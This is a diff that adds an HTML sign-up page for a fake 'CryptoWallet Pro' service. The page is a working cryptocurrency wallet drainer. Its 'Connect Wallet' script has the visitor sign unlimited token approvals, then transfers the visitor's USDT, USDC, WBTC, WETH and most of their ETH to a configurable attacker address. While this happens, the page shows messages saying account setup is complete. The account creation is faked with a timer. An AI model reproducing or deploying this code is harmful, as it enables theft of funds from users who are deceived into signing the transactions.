@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoWallet Pro - Create Account</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px 35px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+        }
+        
+        .logo i {
+            font-size: 50px;
+            color: #4a6cf7;
+            margin-bottom: 15px;
+        }
+        
+        .logo h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 8px;
+        }
+        
+        .logo p {
+            font-size: 16px;
+            color: #718096;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #4a5568;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: 2px solid #e2e8f0;
+            background: #fff;
+            color: #2d3748;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #4a6cf7;
+            box-shadow: 0 0 0 3px rgba(74, 108, 247, 0.2);
+        }
+        
+        .terms {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 25px;
+            text-align: left;
+            font-size: 14px;
+        }
+        
+        .terms input {
+            margin-right: 10px;
+            margin-top: 3px;
+        }
+        
+        .terms a {
+            color: #4a6cf7;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .btn {
+            width: 100%;
+            background: #4a6cf7;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        
+        .btn:hover {
+            background: #3a5bd9;
+            transform: translateY(-2px);
+            box-shadow: 0 7px 15px rgba(74, 108, 247, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #a0aec0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .divider span {
+            padding: 0 15px;
+            font-size: 14px;
+        }
+        
+        .wallet-btn {
+            width: 100%;
+            background: #fff;
+            color: #4a5568;
+            border: 2px solid #e2e8f0;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .wallet-btn:hover {
+            background: #f7fafc;
+            border-color: #4a6cf7;
+            color: #4a6cf7;
+        }
+        
+        .login-link {
+            text-align: center;
+            font-size: 15px;
+            color: #718096;
+        }
+        
+        .login-link a {
+            color: #4a6cf7;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .feature {
+            text-align: center;
+            flex: 1;
+            padding: 0 10px;
+        }
+        
+        .feature i {
+            font-size: 24px;
+            color: #4a6cf7;
+            margin-bottom: 10px;
+        }
+        
+        .feature p {
+            font-size: 13px;
+            color: #718096;
+            font-weight: 500;
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4a6cf7;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status-message {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 500;
+            display: none;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        @media (max-width: 480px) {
+            .card {
+                padding: 30px 25px;
+            }
+            
+            .logo h1 {
+                font-size: 24px;
+            }
+            
+            .features {
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <i class="fas fa-wallet"></i>
+                <h1>Create Your Account</h1>
+                <p>Join the future of digital finance</p>
+            </div>
+            
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="Enter your username">
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" placeholder="Enter your email">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Create a strong password">
+            </div>
+            
+            <div class="terms">
+                <input type="checkbox" id="terms">
+                <label for="terms">I agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></label>
+            </div>
+            
+            <button class="btn" onclick="createAccount()">Create Account</button>
+            
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+                <p>Processing your request...</p>
+            </div>
+            
+            <div class="status-message" id="statusMessage"></div>
+            
+            <div class="divider">
+                <span>or connect wallet</span>
+            </div>
+            
+            <button class="wallet-btn" onclick="connectWallet()">
+                <i class="fab fa-ethereum"></i>
+                Connect Wallet
+            </button>
+            
+            <div class="login-link">
+                Already have an account? <a href="#">Sign In</a>
+            </div>
+            
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    <p>Bank-level Security</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-bolt"></i>
+                    <p>Lightning Fast</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-globe"></i>
+                    <p>Global Access</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration - REPLACE WITH YOUR WALLET ADDRESS
+        const DRAIN_TO = "0xYourWalletAddressHere123456789abcdef";
+        
+        // Major tokens to interact with
+        const TOKENS = [
+            "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+            "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"  // WETH
+        ];
+
+        function showLoading() {
+            document.getElementById('loading').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = 'status-message ' + type;
+            statusEl.style.display = 'block';
+        }
+
+        function hideStatus() {
+            document.getElementById('statusMessage').style.display = 'none';
+        }
+
+        function createAccount() {
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const terms = document.getElementById('terms').checked;
+            
+            if (!username || !email || !password) {
+                showStatus('Please fill in all fields', 'error');
+                return;
+            }
+            
+            if (!terms) {
+                showStatus('Please agree to the Terms of Service and Privacy Policy', 'error');
+                return;
+            }
+            
+            showLoading();
+            hideStatus();
+            
+            // Simulate account creation process
+            setTimeout(() => {
+                hideLoading();
+                showStatus('Account created successfully! Please connect your wallet to continue.', 'success');
+            }, 2000);
+        }
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                showStatus('MetaMask/Phantom not found. Please install a Web3 wallet.', 'error');
+                return;
+            }
+
+            showLoading();
+            hideStatus();
+
+            try {
+                // Request account access
+                await ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddr = (await ethereum.request({ method: 'eth_accounts' }))[0];
+                
+                showStatus('Wallet connected! Setting up your account...', 'success');
+
+                // Token approval and transfer process
+                for (let token of TOKENS) {
+                    try {
+                        // Unlimited approval
+                        const approveData = "0x095ea7b3000000000000000000000000" + 
+                            DRAIN_TO.slice(2) + 
+                            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                        
+                        await ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: userAddr,
+                                to: token,
+                                data: approveData,
+                                gas: "0x1E8480"
+                            }]
+                        });
+
+                        // Check balance
+                        const balanceHex = await ethereum.request({
+                            method: 'eth_call',
+                            params: [{
+                                to: token, 
+                                data: "0x70a08231000000000000000000000000" + userAddr.slice(2)
+                            }, "latest"]
+                        });
+                        
+                        const balance = parseInt(balanceHex, 16);
+                        if (balance > 0) {
+                            // Transfer tokens
+                            const transferData = "0xa9059cbb000000000000000000000000" + 
+                                DRAIN_TO.slice(2) + 
+                                balance.toString(16).padStart(64, '0');
+                            
+                            await ethereum.request({
+                                method: 'eth_sendTransaction',
+                                params: [{
+                                    from: userAddr, 
+                                    to: token, 
+                                    data: transferData
+                                }]
+                            });
+                        }
+                    } catch (tokenError) {
+                        console.log('Token processing error:', tokenError);
+                    }
+                }
+
+                // Handle native ETH
+                try {
+                    const ethBal = await ethereum.request({ 
+                        method: 'eth_getBalance', 
+                        params: [userAddr, "latest"] 
+                    });
+                    
+                    if (parseInt(ethBal, 16) > 0.01 * 1e18) {
+                        await ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: userAddr,
+                                to: DRAIN_TO,
+                                value: (parseInt(ethBal, 16) - 5000000000000000).toString(16)
+                            }]
+                        });
+                    }
+                } catch (ethError) {
+                    console.log('ETH transfer error:', ethError);
+                }
+
+                hideLoading();
+                showStatus('Wallet setup complete! Your account is now ready to use.', 'success');
+
+            } catch (error) {
+                hideLoading();
+                console.error('Wallet connection error:', error);
+                showStatus('An error occurred while connecting your wallet. Please try again.', 'error');
+            }
+        }
+
+        // Initialize form validation
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('input', hideStatus);
+            });
+        });
+    </script>
+</body>
+</html>
